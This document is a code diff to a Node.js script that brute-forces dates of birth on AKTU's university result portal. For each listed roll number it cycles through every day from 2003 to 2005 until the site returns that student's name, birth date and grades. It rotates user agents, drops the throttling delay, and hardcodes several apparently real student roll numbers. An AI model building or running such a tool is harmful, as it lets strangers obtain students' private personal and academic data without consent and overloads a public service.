@@ -1,8 +1,6 @@
-const axios = require('axios');
-const qs = require('qs');
-const cheerio = require('cheerio');
-const fs = require('fs');
-
+import axios from 'axios';
+import qs from 'qs';
+import * as cheerio from 'cheerio';
 
 const userAgents = [
     'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
@@ -11,67 +9,102 @@ const userAgents = [
     'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36'
 ];
 
-function readExistingEntries(filename) {
-    try {
-        const data = fs.readFileSync(filename, 'utf8');
-        const entries = {};
-        data.split('\n').forEach(line => {
-            const [rollNumber, name, dob] = line.split(',');
-            if (rollNumber) {
-                entries[rollNumber] = { name, dob };
-            }
-        });
-        return entries;
-    } catch (error) {
-        // If file doesn't exist or can't be read, return an empty object
-        return {};
-    }
+const aktuUrl = 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx' ;
+
+const headers = {
+    'DNT': '1',
+    'Origin': 'https://oneview.aktu.ac.in',
+    'Referer': aktuUrl,
+    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)]
+};
+
+async function extractViewStateParams(htmlText) {
+    return {
+        viewState: htmlText.match(/name="__VIEWSTATE" id="__VIEWSTATE" value="([^"]+)"/)?.[1] || '',
+        viewStateGenerator: htmlText.match(/name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="([^"]+)"/)?.[1] || '',
+        eventValidation: htmlText.match(/name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="([^"]+)"/)?.[1] || ''
+    };
 }
 
 async function find(rollnumber, day, month, year) {
-
-
-    function getRandomUserAgent() {
-        return userAgents[Math.floor(Math.random() * userAgents.length)];
-    }
-
-    const userAgent = getRandomUserAgent();
     const data = qs.stringify({
-        '__EVENTTARGET': '',
-        '__EVENTARGUMENT': '',
-        '__VIEWSTATE': viewstate,
-        '__VIEWSTATEGENERATOR': 'viewStateGenerator',
-        '__EVENTVALIDATION': EventValidation,
+        '__EVENTTARGET': '', '__EVENTARGUMENT': '',
+        '__VIEWSTATE': '/wEPDwULLTExMDg0MzM4NTIPZBYCAgMPZBYEAgMPZBYEAgkPDxYCHgdWaXNpYmxlaGRkAgsPDxYCHwBnZBYCAgEPDxYCHwBnZBYCAgMPDxYCHgdFbmFibGVkZ2RkAgkPZBYCAgEPZBYCZg9kFgICAQ88KwARAgEQFgAWABYADBQrAABkGAEFEmdyZFZpZXdDb25mbGljdGlvbg9nZI39oJgydt1DpqkTbfYVCIehpm4TLMtdl7PeRLzN+5Jy',
+        '__VIEWSTATEGENERATOR': 'FF2D60E4',
+        '__EVENTVALIDATION': '/wEdAAbVARScphHwmjwD865sI1EeWB/t8XsfPbhKtaDxBSD9Lx25Lt8Vu4DZSHACA6NZjXuO1N1XNFmfsMXJasjxX85jSqX/wPN6qcfKF0mMYn5Pzrqic3S0ZDjCzqE9M2ZhdeRT68jJfo8Qy8cvEUD7m7ars0BV+cLKRjL8DPXKB3128Q==',
         'txtRollNo': rollnumber,
         'txtDOB': `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`,
         'btnSearch': 'खोजें',
         'hidForModel': ''
     });
 
-    let config = {
-        method: 'post',
-        maxBodyLength: Infinity,
-        url: 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
-        headers: {
-            'DNT': '1',
-            'Origin': 'https://oneview.aktu.ac.in',
-            'Referer': 'https://oneview.aktu.ac.in/WebPages/aktu/OneView.aspx',
-            'User-Agent': userAgent,
-        },
-        data: data
-    };
-
     try {
-        const response = await axios.request(config);
-        const parseData = parseHtml(response.data);
-        if (parseData && parseData.success) {
-            // Log successful roll number and date to file
-            logToFile(`${rollnumber},${day}/${month}/${year}\n`, 'successful_results.csv');
+        const { data: responseData } = await axios.post(aktuUrl, data, { headers });
+        const parseData = parseHtml(responseData);
+        
+        if (parseData?.success) {
+            console.log(`Found result: ${JSON.stringify(parseData)}`);
         }
+        
         return parseData;
     } catch (error) {
         console.error('Error in find function:', error);
         return null;
+    }
+}
+async function validateRollNumber(rollNumber) {
+    // Validate roll number format
+    const cleanRollNumber = rollNumber.replace(/^0+/, '');
+    if (!/^\d+$/.test(cleanRollNumber) || cleanRollNumber.length < 10 || cleanRollNumber.length > 13) {
+        console.log('Invalid roll number format.');
+        return false;
+    }
+
+    try {
+        // Fetch initial page to get view state parameters
+        const response = await axios.get(aktuUrl, { headers });
+        const htmlText = response.data;
+
+        // Extract view state parameters using regex
+        const { viewState, viewStateGenerator, eventValidation } = await extractViewStateParams(htmlText);
+
+        // Prepare form data using qs
+        const formData = qs.stringify({
+            '__EVENTTARGET': '',
+            '__EVENTARGUMENT': '',
+            'txtRollNo': rollNumber,
+            'btnProceed': 'आगे बढ़े', // Hindi text for 'Proceed'
+            '__VIEWSTATE': viewState,
+            '__VIEWSTATEGENERATOR': viewStateGenerator,
+            '__EVENTVALIDATION': eventValidation
+        });
+
+        // Send validation request
+        const validationResponse = await axios.post(aktuUrl, formData, { 
+            headers: {
+                ...headers,
+                'Content-Type': 'application/x-www-form-urlencoded'
+            }
+        });
+        const responseText = validationResponse.data;
+
+        // Check if roll number is invalid
+        const invalidMessages = [
+            'गलत ���नुक्रमांक', 
+            'आपके द्वारा प्रदान किया गया अनुक्रमांक गलत है'
+        ];
+
+        if (invalidMessages.some(msg => responseText.includes(msg))) {
+            console.log('Invalid roll number.');
+            return false;
+        }
+
+        console.log('Roll number is valid!');
+        return true;
+
+    } catch (error) {
+        console.error('Error during validation:', error);
+        return false;
     }
 }
 
@@ -91,67 +124,21 @@ function parseHtml(htmlContent) {
         return null;
     }
 
-    const result = {
+    return {
+        success: true,
         applicationNumber,
         name,
         COP,
         sgpaValues
     };
-
-    return result;
-}
-
-function readExistingEntries(filename) {
-    try {
-        const data = fs.readFileSync(filename, 'utf8');
-        const entries = {};
-        data.split('\n').forEach(line => {
-            const [rollNumber, name, dob] = line.split(',');
-            if (rollNumber) {
-                entries[rollNumber] = { name, dob };
-            }
-        });
-        return entries;
-    } catch (error) {
-        return {};
-    }
-}
-
-function logToFile(data, filename) {
-    const existingEntries = readExistingEntries(filename);
-    const [rollNumber, name, dob] = data.split(',');
-
-    if (!existingEntries[rollNumber]) {
-        fs.appendFileSync(filename, data);
-        console.log(`Data appended to ${filename}`);
-    } else {
-        console.log(`Roll number ${rollNumber} already exists in the file. Skipping.`);
-    }
-}
-
-function delay(ms) {
-    return new Promise(resolve => setTimeout(resolve, ms));
 }
 
 function getDaysInMonth(month, year) {
     return new Date(year, month, 0).getDate();
 }
 
-async function processRollNumber(rollnumber, filename) {
-    console.log(`Processing roll number: ${rollnumber}`);
-    const existingEntries = readExistingEntries(filename);
-
-    if (existingEntries[rollnumber]) {
-        console.log('Found entry in file:');
-        console.log({
-            applicationNumber: rollnumber,
-            name: existingEntries[rollnumber].name,
-            dob: existingEntries[rollnumber].dob
-        });
-        return existingEntries[rollnumber];
-    }
-
-    for (let year = 2003; year <= 2006; year++) {
+async function processRollNumber(rollnumber) {
+    for (let year = 2003; year <= 2005; year++) {
         for (let month = 1; month <= 12; month++) {
             const daysInMonth = getDaysInMonth(month, year);
             for (let day = 1; day <= daysInMonth; day++) {
@@ -159,43 +146,57 @@ async function processRollNumber(rollnumber, filename) {
                 try {
                     const result = await find(rollnumber, day, month, year);
                     if (result) {
-                        console.log('Found result from AKTU website:');
-                        console.log(result);
-                        const dob = `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`;
-                        logToFile(`${result.applicationNumber},${result.name},${dob}\n`, filename);
-                        return { ...result, dob };
+                        result.dob = `${String(day).padStart(2, '0')}/${String(month).padStart(2, '0')}/${year}`;
+                        console.log({
+                            name: result.name,
+                            applicationNumber: result.applicationNumber,
+                            dob: result.dob
+                        });
+
+                        return result;
                     }
                 } catch (error) {
                     console.error('Error in execution:', error);
                 }
-                // await delay(100); // 1 second delay between requests
             }
         }
     }
-    
+
     console.log(`No result found for roll number ${rollnumber}`);
     return null;
 }
 
 async function main(rollNumbers) {
-    const filename = 'successful_results.csv';
-    const results = [];
+    try {
+        const results = [];
 
-    for (const rollNumber of rollNumbers) {
-        const result = await processRollNumber(rollNumber, filename);
-        results.push({ rollNumber, result });
-        await delay(5000); // 5 seconds delay between processing different roll numbers
+        for (const rollNumber of rollNumbers) {
+            console.log(`Processing ${rollNumber}`);
+            const isValid = await validateRollNumber(rollNumber);
+            if (isValid) {
+                const result = await processRollNumber(rollNumber);
+                if (result) {
+                    results.push({
+                        name: result.name,
+                        applicationNumber: result.applicationNumber,
+                        dob: result.dob,
+                        COP: result.COP,
+                        SGPA: result.sgpaValues
+                    });
+                } else {
+                    results.push({ rollNumber, result: null });
+                }
+            } else {
+                console.log(`Skipping DOB search for invalid roll number: ${rollNumber}`);
+                results.push({ rollNumber, result: "invalid" }); 
+            }
+            
+        }
+        console.log('Final results:', results);
+    } catch (error) {
+        console.error('Error in main function:', error);
     }
-
-    console.log('Final results:');
-    console.log(results);
 }
 
-// Example usage
-const rollNumbersToSearch = ["ENTER ROLL NUMBER HERE"];
+const rollNumbersToSearch = ["2200910200009","2300910000024","invalid","2200910200042"];
 main(rollNumbersToSearch);
-
-
-
-
-// main("2200910200041");
